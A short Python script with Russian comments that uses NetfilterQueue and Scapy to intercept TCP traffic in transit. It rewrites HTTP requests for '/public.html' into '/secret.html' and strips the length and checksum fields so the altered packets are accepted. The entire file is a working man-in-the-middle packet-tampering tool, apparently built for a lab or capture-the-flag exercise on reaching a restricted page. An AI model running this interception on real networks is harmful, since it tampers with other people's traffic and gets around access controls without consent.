from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

def interception(packet):
    scapy_packet = IP(packet.get_payload())     # пакет NetfilterQueue -> объект Scapy
    if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(Raw): # содержание слоя TCP и Raw (полезной нагрузки)
        payload = scapy_packet[Raw].load
        if b"GET /public.html" in payload:
            modified_payload = payload.replace(b"GET /public.html", b"GET /secret.html")
            scapy_packet[Raw].load = modified_payload
            del scapy_packet[IP].len
            del scapy_packet[TCP].chksum #удаляем это все, чтобы пакет не рассматривался, как битый
            packet.set_payload(bytes(scapy_packet))
            print("modified")
    packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0, interception)
nfqueue.run()
